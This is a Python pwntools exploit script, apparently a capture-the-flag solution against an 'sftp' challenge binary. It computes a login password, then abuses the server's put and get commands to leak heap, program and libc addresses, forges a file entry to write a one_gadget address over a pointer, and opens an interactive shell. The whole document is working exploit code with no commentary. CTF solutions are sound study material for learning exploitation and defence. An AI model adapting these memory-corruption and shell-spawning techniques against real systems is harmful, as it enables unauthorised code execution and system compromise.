
from pwn import *
target = 0x8dfa
x = 0x5417
sol =""
for i in range(15,1,-1):
	a = (target>>i)&1
	b = x&1
	if i>1:
		c = (a^b)+6
	else:
		c = (a^b)+4
	sol +=chr(c)
	if i!= 0:
		x = (x^c)*2

sol+=chr(5)

#r = remote("sftp.ctfcompetition.com", 1337)
r = process(["./sftp"])
r.sendlineafter("yes","yes")
r.sendlineafter(":",sol)
r.sendlineafter(">","rm flag")
r.sendlineafter(">","rmdir src")
r.sendlineafter(">","put a")
r.sendline("65535")
r.send("a"*65535)

data  = ""
while True:
	r.sendlineafter(">","mkdir test")
	r.sendlineafter(">","get a")
	r.recvline()
	data =  r.recvn(65535)
	if "a"*63335 in data:
		r.sendlineafter(">","rmdir test")
	else:
		break
ans_len = 0

for i in range(65536):
	if data[i] != "a":
		ans_len = i
		break


home = u64( data[ans_len:ans_len+8])
r.sendlineafter(">","put a")
r.sendline("65535")

payload = "a"*ans_len+p64(home)+p32(0x2)+"test".ljust(20,'\x00')+p64(0x8)+p64(home)
r.send(payload.ljust(65535,"a"))

r.sendlineafter(">","get test")
r.recvline()
text = u64(r.recvn(8))-0x208be0
print hex(text)


r.sendlineafter(">","put a")
r.sendline("65535")
payload = "a"*ans_len+p64(home)+p32(0x2)+"test".ljust(20,'\x00')+p64(0x8)+p64(text+0x205028)
r.send(payload.ljust(65535,"a"))


r.sendlineafter(">","get test")
r.recvline()
libc = u64(r.recvn(8))-0x6f690
print hex(libc)


one_gadget = libc+0xf1147
r.sendlineafter(">","put test")
r.sendline("8")
r.send(p64(one_gadget))
r.interactive()



